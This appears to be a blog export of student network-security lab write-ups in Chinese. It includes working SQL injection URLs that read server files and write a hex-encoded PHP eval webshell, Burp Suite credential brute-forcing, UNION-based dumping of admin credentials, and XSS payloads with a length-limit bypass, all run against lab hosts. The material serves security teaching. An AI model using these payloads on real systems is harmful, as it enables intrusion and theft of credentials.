<p>修改openvpn服务端的配置文件/etc/openvpn/server.conf：服务器主机IP地址,取消注释改为local 192.168.1.6。添加静态路由注入，使VPN拔入后能访问192.168.2.0/24网络。</p>
<p>1.2 192.168.1.5 vpn连接</p>
<p>rdesktop远程登录192.168.1.5，如下图</p>
<p><img src="/2020/05/25/2020-05-25-Network-Security-Experiment-5/image-20200611181417846.png" alt="image-20200611181417846"></p>
<p>登录成功后先从192.168.1.4下载openvpn.zip包，如下图</p>
<p><img src="/2020/05/25/2020-05-25-Network-Security-Experiment-5/image-20200611181430143.png" alt="image-20200611181430143"></p>
<p>安装openvpn：</p>
<p><img src="/2020/05/25/2020-05-25-Network-Security-Experiment-5/image-20200611181439109.png" alt="image-20200611181439109"></p>
<p>将192.168.1.6生成的客户端配置文件上传到192.168.1.4上，如下图</p>
<p><img src="/2020/05/25/2020-05-25-Network-Security-Experiment-5/image-20200611181453412.png" alt="image-20200611181453412"></p>
<p>192.168.1.5通过ftp下载上述文件：</p>
<p><img src="/2020/05/25/2020-05-25-Network-Security-Experiment-5/wps1.jpg" alt="img"></p>
<p>放到config目录下：</p>
<p><img src="/2020/05/25/2020-05-25-Network-Security-Experiment-5/wps2.jpg" alt="img"></p>
<p>配置client.ovpn，修改如下：</p>
<p><img src="/2020/05/25/2020-05-25-Network-Security-Experiment-5/wps3.jpg" alt="img"></p>
<p><img src="/2020/05/25/2020-05-25-Network-Security-Experiment-5/wps4.jpg" alt="img"> </p>
<p><img src="/2020/05/25/2020-05-25-Network-Security-Experiment-5/wps5.jpg" alt="img"></p>
<p>然后将修改好的client.ovpn也放入config文件夹下(其实也不用)：</p>
<p><img src="/2020/05/25/2020-05-25-Network-Security-Experiment-5/wps6.jpg" alt="img"></p>
<p>将客户端windows时钟修改与192.168.1.6保持一致：</p>
<p>然后以管理员身份运行client.ovpn：</p>
<p><img src="/2020/05/25/2020-05-25-Network-Security-Experiment-5/wps7.jpg" alt="img"></p>
<p>尝试一下可以登录192.168.2.3</p>
<p><img src="/2020/05/25/2020-05-25-Network-Security-Experiment-5/image-20200611181537602.png" alt="image-20200611181537602"></p>
<p>1.3 使用wwwscan获取网站目录信息</p>
<p>192.168.1.5从192.168.1.4上下载工具tools.zip：</p>
<p><img src="/2020/05/25/2020-05-25-Network-Security-Experiment-5/wps9.jpg" alt="img"></p>
<p>用其中的wwwscan对192.168.2.3进行扫描：</p>
<p><img src="/2020/05/25/2020-05-25-Network-Security-Experiment-5/wps10.jpg" alt="img"></p>
<p><img src="/2020/05/25/2020-05-25-Network-Security-Experiment-5/wps11.jpg" alt="img"></p>
<p>可以发现/manager/login.php，这个应该就是网站后台登录界面了。</p>
<p><img src="/2020/05/25/2020-05-25-Network-Security-Experiment-5/wps12.jpg" alt="img"></p>
<p>1.4 burpsuite爆破网站后台权限，获取网站根目录key04.txt文件内容</p>
<p>配置浏览器代理：</p>
<p><img src="/2020/05/25/2020-05-25-Network-Security-Experiment-5/wps13.jpg" alt="img"></p>
<p>打开burpsuite后任意输入用户名和密码登录：</p>
<p><img src="/2020/05/25/2020-05-25-Network-Security-Experiment-5/wps14.jpg" alt="img"></p>
<p><img src="/2020/05/25/2020-05-25-Network-Security-Experiment-5/wps15.jpg" alt="img"></p>
<p>标记userid和pwd字段：</p>
<p><img src="/2020/05/25/2020-05-25-Network-Security-Experiment-5/wps16.jpg" alt="img"></p>
<p>使用burpsuite提供的密码本：</p>
<p><img src="/2020/05/25/2020-05-25-Network-Security-Experiment-5/wps17.jpg" alt="img"></p>
<p>爆破得到用户名admin密码1q2w3e4r：</p>
<p><img src="/2020/05/25/2020-05-25-Network-Security-Experiment-5/wps18.jpg" alt="img"></p>
<p>登录后台，在文件管理器-&gt;根目录下发现key04.txt：</p>
<p><img src="/2020/05/25/2020-05-25-Network-Security-Experiment-5/image-20200611181735147.png" alt="image-20200611181735147"></p>
<p>打开文件，内容为www：</p>
<p><img src="/2020/05/25/2020-05-25-Network-Security-Experiment-5/image-20200611181708905.png" alt="image-20200611181708905"></p>
<p>1.5 利用sql注入漏洞上传木马文件到网站目录</p>
<p>利用sql注入漏洞上传木马文件到网站目录，注入过程与企业渗透一做法相同。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.2.3&#x2F;sql&#x2F;</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;192.168.2.3&#x2F;sql&#x2F;id&#x3D;2%0Aand%0A1&#x3D;1--发现可以将空格代替为%0A</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;192.168.2.3&#x2F;sql&#x2F;?id&#x3D;2%0Aorder%0Aby%0A10--不报错</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;192.168.2.3&#x2F;sql&#x2F;?id&#x3D;2%0Aorder%0Aby%0A11--报错说明有10个字段</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;192.168.2.3&#x2F;sql&#x2F;index.php?id&#x3D;1%0Aununionion%0Aselselectect%0A1,2,</span><br><span class="line">user(),4,5,6,7,8,9,10--%0A--使用union联合查询，尝试判断当前连接数据库的用户，发现注入点为root权限</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;192.168.2.3&#x2F;sql&#x2F;index.php?id&#x3D;1%ununionion%0Aselselectect%0A1,2,</span><br><span class="line">load_file(%22&#x2F;etc&#x2F;httpd&#x2F;conf&#x2F;httpd.conf%22),4,5,6,7,8,9,10--%0A--尝试读取webserver的配置文件，通过查看源代码找到网站配置路径为&#x2F;var&#x2F;www&#x2F;html</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;192.168.2.3&#x2F;sql&#x2F;index.php?id&#x3D;1%0Aununionion%0Aselselectect%0A1,2,0x3c3f706870206576616c28245f504f53545b636d645d293b3f3e,4,5,6,7,8,9,10%0Ainto%0Aoutfile%0A%27&#x2F;var&#x2F;www&#x2F;html&#x2F;shell.php%27--在该路径中插入一句话木马，木马采用十六进制编码，内容为&#96;&#96;&#96;&lt;? php eval($_POST[cmd]); ?&gt;</span><br></pre></td></tr></table></figure>
<p>```</p>
<p>1.6 使用菜刀工具获取系统权限</p>
<p>上传成功后用菜刀连接一句话木马</p>
<p><img src="/2020/05/25/2020-05-25-Network-Security-Experiment-5/image-20200611182920315.png" alt="image-20200611182920315"></p>
<p>1.7 获取系统根目录下的key4.txt文件</p>
<p>连接成功后可以看到key04.txt：</p>
<p><img src="/2020/05/25/2020-05-25-Network-Security-Experiment-5/wps23.jpg" alt="img"></p>
<h3 id="【提交结果】-2"><a href="#【提交结果】-2" class="headerlink" title="【提交结果】"></a>【提交结果】</h3><p>1、提交key04.txt文件内容</p>
<p><img src="/2020/05/25/2020-05-25-Network-Security-Experiment-5/image-20200611183806672.png" alt="image-20200611183806672"></p>
<p>2、提交key4.txt文件内容</p>
<p><img src="/2020/05/25/2020-05-25-Network-Security-Experiment-5/image-20200611183814741.png" alt="image-20200611183814741"></p>
]]></content>
      <categories>
        <category>实验</category>
      </categories>
      <tags>
        <tag>实验</tag>
      </tags>
  </entry>
  <entry>
    <title>网安平台实验4</title>
    <url>/2020/05/24/2020-05-24-Network-Security-Experiment-4/</url>
    <content><![CDATA[<h1 id="5-AppScan扫描器web漏洞"><a href="#5-AppScan扫描器web漏洞" class="headerlink" title="5 AppScan扫描器web漏洞"></a>5 AppScan扫描器web漏洞</h1><h2 id="5-1-实验目的"><a href="#5-1-实验目的" class="headerlink" title="5.1 实验目的"></a>5.1 实验目的</h2><p>1)了解AppScan扫描器<br>2)学习AppScan的用法</p>
<h2 id="5-2-实验原理"><a href="#5-2-实验原理" class="headerlink" title="5.2 实验原理"></a>5.2 实验原理</h2><p>Rational AppScan（简称 AppScan）其实是一个产品家族，包括众多的应用安全扫描产品，从开发阶段的源代码扫描的 AppScan source edition，到针对 Web 应用进行快速扫描的 AppScan standard edition，以及进行安全管理和汇总整合的 AppScan enterprise Edition 等。我们经常说的 AppScan 就是指的桌面版本的 AppScan，即 AppScan standard edition。其安装在 Windows 操作系统上，可以对网站等 Web 应用进行自动化的应用安全扫描和测试。<br>AppScan 工作原理小结如下：<br>通过搜索（爬行）发现整个 Web 应用结构<br>根据分析，发送修改的 HTTP Request 进行攻击尝试（扫描规则库）<br>通过对于 Respone 的分析验证是否存在安全漏洞</p>
<h2 id="5-3-实验环境"><a href="#5-3-实验环境" class="headerlink" title="5.3 实验环境"></a>5.3 实验环境</h2><p><img src="http://img.shiyanbar.net/UploadImage/2016/3/1/20_57464" alt><br>目标机：<code>192.168.1.3</code><br>工具：C:\实验工具集\01_WEB安全\01_web扫描技术\</p>
<h2 id="5-4-实验步骤"><a href="#5-4-实验步骤" class="headerlink" title="5.4 实验步骤"></a>5.4 实验步骤</h2><h3 id="一、-开启扫描"><a href="#一、-开启扫描" class="headerlink" title="一、    开启扫描"></a>一、    开启扫描</h3><p>1.1    在C:\实验工具集\01_WEB安全\01_web扫描技术\中，打开AppScan软件，单击“文件”-〉“新建”。如图所示</p>
<p><img src="/2020/05/24/2020-05-24-Network-Security-Experiment-4/image-20200524203013386.png" alt="image-20200524203013386"></p>
<p>1.2    选择要扫描的模板，此处选择【常规扫描】即可，注意下方【启动扫描配置向导】，实际操作中，此处可以不用勾选，本实验仅供演示。如图所示。</p>
<p><img src="/2020/05/24/2020-05-24-Network-Security-Experiment-4/image-20200524203108862.png" alt="image-20200524203108862"></p>
<p>1.3    进入【扫描向导】。如图所示。</p>
<p><img src="/2020/05/24/2020-05-24-Network-Security-Experiment-4/image-20200524203126321.png" alt="image-20200524203126321"></p>
<p>1.4    点击【下一步】，填入URL（<code>http://192.168.1.3:8001</code>）。如图所示。</p>
<p><img src="/2020/05/24/2020-05-24-Network-Security-Experiment-4/image-20200524203153071.png" alt="image-20200524203153071"></p>
<p>1.5    点击【下一步】，进入【选择登录方法界面】，此处默认即可。如图所示。</p>
<p><img src="/2020/05/24/2020-05-24-Network-Security-Experiment-4/image-20200524203224948.png" alt="image-20200524203224948"></p>
<p>1.6    点击【下一步】，在弹出窗口中仍然点击【是】。</p>
<p>1.7    测试策略选择默认【缺省值】即可（注意：有可能显示为英文的【Default】）。如图所示。</p>
<p><img src="/2020/05/24/2020-05-24-Network-Security-Experiment-4/image-20200524203258018.png" alt="image-20200524203258018"></p>
<p>1.8    选择启动扫描方式【启动全面自动扫描】，点击完成，即可进行扫描了。如图所示。</p>
<p><img src="/2020/05/24/2020-05-24-Network-Security-Experiment-4/image-20200524203315696.png" alt="image-20200524203315696"></p>
<p>1.9    在【自动保存】对话框中，选择【是】以保存扫描结果。</p>
<p>1.10    程序自动启动【扫描专家】，扫描过程大概2~3分钟，扫描结束后会给出扫描建议，点击【应用建议】，即可开始扫描。如图所示。</p>
<p><img src="/2020/05/24/2020-05-24-Network-Security-Experiment-4/image-20200524203636173.png" alt="image-20200524203636173"></p>
<p>1.11    扫描过程会很慢，请同学们耐心等待。如图所示。</p>
<h3 id="二、-扫描结果"><a href="#二、-扫描结果" class="headerlink" title="二、    扫描结果"></a>二、    扫描结果</h3><p>2.1    扫描结果。如图11所示</p>
<p><img src="/2020/05/24/2020-05-24-Network-Security-Experiment-4/image-20200524211930718.png" alt="image-20200524211930718"></p>
<p>2.2    点击主界面中的【报告】，即可导出扫描报告。如图12所示</p>
<p><img src="/2020/05/24/2020-05-24-Network-Security-Experiment-4/image-20200524211952814.png" alt="image-20200524211952814"></p>
<p>2.3    点击【保存报告】，将报告保存为【PDF】格式的文档。如图13所示</p>
<p><img src="/2020/05/24/2020-05-24-Network-Security-Experiment-4/image-20200524212039275.png" alt="image-20200524212039275"></p>
<h2 id="5-5-实验思考"><a href="#5-5-实验思考" class="headerlink" title="5.5 实验思考"></a>5.5 实验思考</h2><p>1.如何对扫描结果进行详细分析</p>
<p>在Security Issues Pane（安全问题）中可以看到应用程序存在漏洞的详细信息（如下图），针对每个漏洞列出了具体参数，并且可以查看漏洞的具体情况，用于分析。也可以使用Power tools，包括认证测试，连接测试，编/解码，http请求编辑器，进行详细分析。</p>
<p><img src="/2020/05/24/2020-05-24-Network-Security-Experiment-4/image-20200525065951468.png" alt="image-20200525065951468"></p>
<p><img src="/2020/05/24/2020-05-24-Network-Security-Experiment-4/image-20200525075643870.png" alt="image-20200525075643870"></p>
<h1 id="6-Web应用程序攻击和检查框架w3af"><a href="#6-Web应用程序攻击和检查框架w3af" class="headerlink" title="6 Web应用程序攻击和检查框架w3af"></a>6 Web应用程序攻击和检查框架w3af</h1><h2 id="6-1-实验目的"><a href="#6-1-实验目的" class="headerlink" title="6.1 实验目的"></a>6.1 实验目的</h2><p>1)    利用w3af爬虫插件探测出目标网站的目录结构。</p>
<h2 id="6-1-实验原理"><a href="#6-1-实验原理" class="headerlink" title="6.1 实验原理"></a>6.1 实验原理</h2><p>1)    W3AF是一个web应用安全的攻击、审计平台，通过增加插件来对功能进行扩展。这是一款用python写的工具，可以查看所有源代码。支持GUI，也支持命令行模式。<br>2)    本框架拥有三种类型的插件：漏洞挖掘（discovery）、漏洞分析（audit）和漏洞攻击（attack）。漏洞挖掘插件只负责一件事情：搜寻新的URL、表单和其它注入点（injection points）。Web spider便是一个经典的漏洞挖掘插件。这个插件以一个URL为输入，然后得到一个或多个注入点。当用户使用多个这种类型的插件时，这些插件会运行这样的循环：如果插件A在第一次运行时发现了一个新的URL,w3af内核将这个URL传递给插件B。如果插件B发现了一个新的URL，它也将被发送给插件A。这个过程将一直持续下去，所有的插件都将运行工作，占用应用资源，直到无法运行漏洞挖掘应用。漏洞分析插件则获取那些有漏洞挖掘插件找到的注入点，为了发现漏洞，漏洞分析插件会向所有可注入点发送特别设计的数据。例如使用一个漏洞分析插件来获取SQL注入的漏洞。漏洞攻击插件的作用是利用分析插件发现的漏洞。它们通常会得到一个远程服务器的shell，或者一个利用SQL注入漏洞获取的远程数据库表。</p>
<h2 id="6-1-实验环境"><a href="#6-1-实验环境" class="headerlink" title="6.1 实验环境"></a>6.1 实验环境</h2><p>Kali操作系统</p>
<p><img src="/2020/05/24/2020-05-24-Network-Security-Experiment-4/image-20200523195226289.png" alt="image-20200523195226289"></p>
<h2 id="6-1-实验步骤"><a href="#6-1-实验步骤" class="headerlink" title="6.1 实验步骤"></a>6.1 实验步骤</h2><h3 id="一、启动w3af软件"><a href="#一、启动w3af软件" class="headerlink" title="一、启动w3af软件"></a>一、启动w3af软件</h3><p>1.1    单击桌面空白处，右键菜单选择“在终端中打开”。</p>
<p>1.2    在终端中输入命令“w3af_console”，启动控制台。W3af有两种用户界面：控制台界面和图形界面。如图所示</p>
<p><img src="/2020/05/24/2020-05-24-Network-Security-Experiment-4/image-20200524204614907.png" alt="image-20200524204614907"></p>
<p>1.3    在终端中输入命令“help”,显示可用的命令参数。如图所示</p>
<p><img src="/2020/05/24/2020-05-24-Network-Security-Experiment-4/image-20200524210000126.png" alt="image-20200524210000126"></p>
<p>1.4 对命令参数的详细帮助可以使用help命令显示出来，例如help start。如图所示</p>
<p><img src="/2020/05/24/2020-05-24-Network-Security-Experiment-4/image-20200524210032819.png" alt="image-20200524210032819"></p>
<p>1.5 进入到配置菜单后，输入某个菜单即可切换到此菜单模式下，所有配置菜单均提供以下命令：help、view、set、back。这里选择target菜单。如图所示</p>
<p><img src="/2020/05/24/2020-05-24-Network-Security-Experiment-4/image-20200524210057951.png" alt="image-20200524210057951"></p>
<p>1.6 “view”命令用来列出所有可配置参数，set命令用来改变一个值，back命令返回上一层菜单。可以使用help参数名称，获取每一个配置参数的详细的帮助。如图所示</p>
<p><img src="/2020/05/24/2020-05-24-Network-Security-Experiment-4/image-20200524210204564.png" alt="image-20200524210204564"></p>
<h3 id="二、探测目标网站结构"><a href="#二、探测目标网站结构" class="headerlink" title="二、探测目标网站结构"></a>二、探测目标网站结构</h3><p>2.1    在终端中输入命令“w3af_console”，启动w3af。如图所示</p>
<p>2.2    启动插件。如图所示</p>
<p><img src="/2020/05/24/2020-05-24-Network-Security-Experiment-4/image-20200524210329344.png" alt="image-20200524210329344"></p>
<p>2.3    启用find_backdoors、phpinfo和web_spider这三个插件。如图所示</p>
<p><img src="/2020/05/24/2020-05-24-Network-Security-Experiment-4/image-20200524210535624.png" alt="image-20200524210535624"></p>
<p>2.4    列出所有用于漏洞的插件。如图所示</p>
<p><img src="/2020/05/24/2020-05-24-Network-Security-Experiment-4/image-20200524210557909.png" alt="image-20200524210557909"></p>
<p>2.5    启用blind_sqli、file_upload、os_commanding、sqli和xss这五个插件。如图所示</p>
<p><img src="/2020/05/24/2020-05-24-Network-Security-Experiment-4/image-20200524210636283.png" alt="image-20200524210636283"></p>
<p>2.6    设置输出插件。如图所示</p>
<p><img src="/2020/05/24/2020-05-24-Network-Security-Experiment-4/image-20200524210654837.png" alt="image-20200524210654837"></p>
<p>2.7    设置输出信息的存储文件。如图所示</p>
<p><img src="/2020/05/24/2020-05-24-Network-Security-Experiment-4/image-20200524210725916.png" alt="image-20200524210725916"></p>
<p>2.8    查看存储设置参数。如图所示</p>
<p><img src="/2020/05/24/2020-05-24-Network-Security-Experiment-4/image-20200524210922186.png" alt="image-20200524210922186"></p>
<p>2.9    设置目标地址参数。如图所示</p>
<p><img src="/2020/05/24/2020-05-24-Network-Security-Experiment-4/image-20200524211125628.png" alt="image-20200524211125628"></p>
<p>2.10    开始攻击。如图所示</p>
<p><img src="/2020/05/24/2020-05-24-Network-Security-Experiment-4/image-20200524211138041.png" alt="image-20200524211138041"></p>
<h2 id="6-5-实验思考"><a href="#6-5-实验思考" class="headerlink" title="6.5 实验思考"></a>6.5 实验思考</h2><p>1．实验中是否探测出目标系统的版本，如果没有，请问如何使探测更加准确？</p>
<p>答：</p>
<p>没有探测出目标系统版本，应该通过audit设置更多更精确的插件。</p>
<p><img src="/2020/05/24/2020-05-24-Network-Security-Experiment-4/image-20200525065711824.png" alt="image-20200525065711824"></p>
<h1 id="7-SQL注入原理-手工联合查询注入技术"><a href="#7-SQL注入原理-手工联合查询注入技术" class="headerlink" title="7 SQL注入原理-手工联合查询注入技术"></a>7 SQL注入原理-手工联合查询注入技术</h1><h2 id="7-1-实验目的"><a href="#7-1-实验目的" class="headerlink" title="7.1 实验目的"></a>7.1 实验目的</h2><p>1）理解联合查询的原理<br>2）学习联合查询的过程</p>
<h2 id="7-2-实验原理"><a href="#7-2-实验原理" class="headerlink" title="7.2 实验原理"></a>7.2 实验原理</h2><p>首先，在链接后面添加语句【order by 11（数字任意）】，根据页面返回结果，来判断站点中的字段数目。<br>然后，在链接后面添加语句【union select 1,2,3,4,5,6,7,8,9,10,11 from admin（表名）】，进行联合查询，来暴露可查询的字段编号。<br>最后，根据上一步得到的字段编号，添加语句【union select 1,admin,password,4,5,6,7,8,9,10,11 from admin】，直接暴露管理员用户名和密码。</p>
<h2 id="7-3-实验环境"><a href="#7-3-实验环境" class="headerlink" title="7.3 实验环境"></a>7.3 实验环境</h2><p><img src="/2020/05/24/2020-05-24-Network-Security-Experiment-4/image-20200524235419004.png" alt="image-20200524235419004"></p>
<p>目标机：<code>192.168.1.3</code></p>
<h2 id="7-4-实验步骤"><a href="#7-4-实验步骤" class="headerlink" title="7.4 实验步骤"></a>7.4 实验步骤</h2><h3 id="一、检测字段长度"><a href="#一、检测字段长度" class="headerlink" title="一、检测字段长度"></a>一、检测字段长度</h3><p>1.1随便点击一个链接【<code>http://192.168.1.3:8008/onews.asp?id=45</code>】，在后面添加语句【order by 11】，页面显示正常。如图所示。</p>
<p><img src="/2020/05/24/2020-05-24-Network-Security-Experiment-4/image-20200524235556599.png" alt="image-20200524235556599"></p>
<p>1.2同样添加语句【order by 12】页面报错，所以此站字段长度为11。如图所示。</p>
<p><img src="/2020/05/24/2020-05-24-Network-Security-Experiment-4/image-20200524235625733.png" alt="image-20200524235625733"></p>
<h3 id="二、暴管理员用户、密码"><a href="#二、暴管理员用户、密码" class="headerlink" title="二、暴管理员用户、密码"></a>二、暴管理员用户、密码</h3><p>2.1在连接后面添加语句【union select 1,2,3,4,5,6,7,8,9,10,11 from admin】，页面显示数字2和3。如图所示。</p>
<p><img src="/2020/05/24/2020-05-24-Network-Security-Experiment-4/image-20200524235716068.png" alt="image-20200524235716068"></p>
<p>2.2在连接后面添加语句【union select 1,admin,password,4,5,6,7,8,9,10,11 from admin】，即可暴出管理员用户名和密码。如图所示。</p>
<p><img src="/2020/05/24/2020-05-24-Network-Security-Experiment-4/image-20200524235755653.png" alt="image-20200524235755653"></p>
<p>2.3到此，即可知道管理员用户名【admin】和密码【bfpms】。</p>
<h2 id="7-5-实验思考"><a href="#7-5-实验思考" class="headerlink" title="7.5 实验思考"></a>7.5 实验思考</h2><p>1.什么是联合查询</p>
<p>答：</p>
<p>联合查询是可合并多个相似的选择查询的结果集。等同于将一个表追加到另一个表，从而实现将两个表的查询组合到一起，使用谓词为UNION或UNION ALL。</p>
<p><img src="/2020/05/24/2020-05-24-Network-Security-Experiment-4/image-20200524235818227.png" alt="image-20200524235818227"></p>
<h1 id="8-跨站脚本攻击之反射型XSS"><a href="#8-跨站脚本攻击之反射型XSS" class="headerlink" title="8 跨站脚本攻击之反射型XSS"></a>8 跨站脚本攻击之反射型XSS</h1><h2 id="8-1-实验目的"><a href="#8-1-实验目的" class="headerlink" title="8.1 实验目的"></a>8.1 实验目的</h2><p>1） 理解反射型XSS的原理<br>2） 学习反射性XSS的实现过程</p>
<h2 id="8-2-实验原理"><a href="#8-2-实验原理" class="headerlink" title="8.2 实验原理"></a>8.2 实验原理</h2><p>XSS又叫CSS （Cross Site Script）跨站脚本攻击。它指的是恶意攻击者往Web页面里插入恶意代码，当用户浏览该页之时，嵌入其中Web里面的html代码会被执行，从而达到恶意攻击用户的特殊目的。在XSS的攻击方式中需要欺骗用户自己去点击链接才能触发XSS称为反射型XSS。</p>
<h2 id="8-3-实验环境"><a href="#8-3-实验环境" class="headerlink" title="8.3 实验环境"></a>8.3 实验环境</h2><p><img src="/2020/05/24/2020-05-24-Network-Security-Experiment-4/image-20200525070826815.png" alt="image-20200525070826815"></p>
<p>目标机：<code>192.168.1.3</code></p>
<p>工具: <code>C:\实验工具集\01_WEB安全\03_跨站脚本技术</code></p>
<p>发现了05年期间互联网，有些久远了……，秋潮视觉工作室，百度搜了搜，已经是一个网络安全入门的学习系统了hhh</p>
<p><img src="/2020/05/24/2020-05-24-Network-Security-Experiment-4/image-20200525071853160.png" alt="image-20200525071853160"></p>
<h2 id="8-4-实验步骤"><a href="#8-4-实验步骤" class="headerlink" title="8.4 实验步骤"></a>8.4 实验步骤</h2><h3 id="一、打开测试站点"><a href="#一、打开测试站点" class="headerlink" title="一、打开测试站点"></a>一、打开测试站点</h3><p>1.1 在IE地址栏中输入测试路径【<code>http://192.168.1.3:8006/input.htm</code>】。如图所示</p>
<p><img src="/2020/05/24/2020-05-24-Network-Security-Experiment-4/image-20200525072110578.png" alt="image-20200525072110578"></p>
<p>1.2 在表单中输入【hello】，点击【提交】，输出结果正常，没有其他影响。如图所示</p>
<p><img src="/2020/05/24/2020-05-24-Network-Security-Experiment-4/image-20200525072132311.png" alt="image-20200525072132311"></p>
<h3 id="二、在站点中输入XSS代码"><a href="#二、在站点中输入XSS代码" class="headerlink" title="二、在站点中输入XSS代码"></a>二、在站点中输入XSS代码</h3><p>2.1 在表单中输入XSS代码【<code>&amp;lt;script&amp;gt;alert(&#39;hello&#39;)&amp;lt;/script&amp;gt;</code>】，点击【提交】。如图所示</p>
<p><img src="/2020/05/24/2020-05-24-Network-Security-Experiment-4/image-20200525072243699.png" alt="image-20200525072243699"></p>
<p>2.2 可以看到，当我们提交XSS代码后，浏览器会弹出一个对话框，显示我们输入的内容。如图所示</p>
<p><img src="/2020/05/24/2020-05-24-Network-Security-Experiment-4/image-20200525072213196.png" alt="image-20200525072213196"></p>
<p>2.3 这就是简单的XSS反射型演示。</p>
<h2 id="8-5-实验思考"><a href="#8-5-实验思考" class="headerlink" title="8.5 实验思考"></a>8.5 实验思考</h2><p>1.什么是    </p>
<p>答：</p>
<p>反射型 XSS 一般是攻击者通过特定手法（如电子邮件），诱使用户去访问一个包含恶意代码的 URL，当受害者点击这些专门设计的链接的时候，恶意代码会直接在受害者主机上的浏览器执行。非持久化，通常出现在网站的搜索栏、用户登录口等地方，常用来窃取客户端 Cookies 或进行钓鱼欺骗。</p>
<p><img src="/2020/05/24/2020-05-24-Network-Security-Experiment-4/image-20200525072546969.png" alt="image-20200525072546969"></p>
<h1 id="9-跨站脚本攻击之存储型XSS"><a href="#9-跨站脚本攻击之存储型XSS" class="headerlink" title="9 跨站脚本攻击之存储型XSS"></a>9 跨站脚本攻击之存储型XSS</h1><h2 id="9-1-实验目的"><a href="#9-1-实验目的" class="headerlink" title="9.1 实验目的"></a>9.1 实验目的</h2><p>1) 理解存储型xss的原理<br>2) 了解 XSS利用方法</p>
<h2 id="9-2-实验原理"><a href="#9-2-实验原理" class="headerlink" title="9.2 实验原理"></a>9.2 实验原理</h2><p>所谓跨站脚本攻击(Cross Site Scripting)，为不和层叠样式表(Cascading Style Sheets, CSS)的缩写混淆，故将跨站脚本攻击缩写为XSS。由于部分网站开发人员对用户输入过滤不严，导致用户可以向Web页面里插入恶意html代码，当用户浏览该页之时，嵌入其中Web里面的html代码会被执行，从而达到恶意攻击用户的特殊目的。</p>
<h2 id="9-3-实验环境"><a href="#9-3-实验环境" class="headerlink" title="9.3 实验环境"></a>9.3 实验环境</h2><p><img src="/2020/05/24/2020-05-24-Network-Security-Experiment-4/image-20200525072848547.png" alt="image-20200525072848547"></p>
<p>目标机：<code>http://192.168.1.3:8080/2</code></p>
<p>工具: <code>C:\实验工具集\01_WEB安全\03_跨站脚本技术</code></p>
<h2 id="9-4-实验步骤"><a href="#9-4-实验步骤" class="headerlink" title="9.4 实验步骤"></a>9.4 实验步骤</h2><h3 id="一、寻找XSS漏洞"><a href="#一、寻找XSS漏洞" class="headerlink" title="一、寻找XSS漏洞"></a>一、寻找XSS漏洞</h3><p>1.1 在IE地址栏中输入目标站点地址【<code>http://192.168.1.3:8080/2</code>】，即可进入目标站点。如图所示</p>
<p><img src="/2020/05/24/2020-05-24-Network-Security-Experiment-4/image-20200525073231254.png" alt="image-20200525073231254"></p>
<p>1.2 由于对用户的输入过滤不严导致XSS，所以一般XSS会存在在交互页面,比如留言板、登录框等。点击【在线留言】，进入在线留言页面。如图所示</p>
<p><img src="/2020/05/24/2020-05-24-Network-Security-Experiment-4/image-20200525073302149.png" alt="image-20200525073302149"></p>
<p>1.3 在交互页面提交请求，进行尝试输入不同的内容，寻找XSS漏洞存在的点。如图所示</p>
<p><img src="/2020/05/24/2020-05-24-Network-Security-Experiment-4/image-20200525073408229.png" alt="image-20200525073408229"></p>
<p>1.4 交互界面返回信息。如图所示</p>
<p><img src="/2020/05/24/2020-05-24-Network-Security-Experiment-4/image-20200525073732600.png" alt="image-20200525073732600"></p>
<p>1.5 经过页面提交留言测试，发现留言标题文本框对输入的文字长度进行了限制,所以,我们的这一次尝试是失败的，我们需要调整XSS代码以绕过防护。</p>
<h3 id="二、XSS漏洞利用"><a href="#二、XSS漏洞利用" class="headerlink" title="二、XSS漏洞利用"></a>二、XSS漏洞利用</h3><p>2.1这里使用注释的方式绕过代码对长度的限制。</p>
<p>2.2对交互页面进行输入恶意代码。我们先尝试提交<code>*/&lt;/script&gt;</code>点击提交。如图所示</p>
<p><img src="/2020/05/24/2020-05-24-Network-Security-Experiment-4/image-20200525074759797.png" alt="image-20200525074759797"></p>
<p>2.3 显示提交成功，我们继续提交下一段代码<code>&lt;script&gt;alert(/xss/)/*</code>来配合上一段代码执行。如图所示</p>
<p><img src="/2020/05/24/2020-05-24-Network-Security-Experiment-4/image-20200525074804640.png" alt="image-20200525074804640"></p>
<p>2.4 当管理员进入管理后台，进入留言管理，管理后台为<code>http://192.168.1.3:8080/2/admin/login.php</code>用户名和密码均为admin。如图所示</p>
<p><img src="/2020/05/24/2020-05-24-Network-Security-Experiment-4/image-20200525074338966.png" alt="image-20200525074338966"></p>
<p>2.5 我们登陆后，查看左边的【留言管理】下的【留言列表】时，会触发用户输入的恶意代码，成功弹窗。如图所示</p>
<p><img src="/2020/05/24/2020-05-24-Network-Security-Experiment-4/image-20200525074755257.png" alt="image-20200525074755257"></p>
<p>2.6通过使用注释符成功的绕过了系统对留言标题长度的限制后，恶意代码成功的执行，完成弹窗攻击。</p>
<h2 id="9-5-实验思考"><a href="#9-5-实验思考" class="headerlink" title="9.5 实验思考"></a>9.5 实验思考</h2><p><strong>1.如何判断页面存在xss</strong></p>
<ol>
<li><p>储存型XSS：</p>
<p>一般是构造一个比如说”<code>&lt;script&gt;alert(&quot;XSS&quot;)&lt;/script&gt;</code>“的JS的弹窗代码进行测试，看是否提交后在页面弹窗，这种储存型XSS是被写入到页面当中的，如果管理员不处理，那么将永久存在，这种XSS攻击者可以通过留言等提交方式，把恶意代码植入到服务器网站上， 一般用于盗取COOKIE获取管理员的信息和权限。</p>
</li>
<li><p>反射型XSS：</p>
<p>一般是在浏览器的输入栏也就是urlget请求那里输入XSS代码，例如：<code>127.0.0.1/admin.php?key=&quot;&gt;&lt;script&gt;alert(&quot;xss&quot;)&lt;/script&gt;</code>，也是弹窗JS代码。当攻击者发送一个带有XSS代码的url参数给受害者，那么受害者可能会使自己的cookie被盗取或者“弹框“，这种XSS一次性使用，危害比储存型要小很多。</p>
</li>
<li><p>dom型：</p>
<p>常用于挖掘，是因为api代码审计不严所产生的，这种dom的XSS弹窗可利用和危害性并不是很大，大多用于钓鱼。比起存储型和反射型，DOM型并不常用。</p>
</li>
</ol>
<p><strong>2.xss还有那些其他的利用方式</strong></p>
<p>通过会话劫持，木马，钓鱼等。</p>
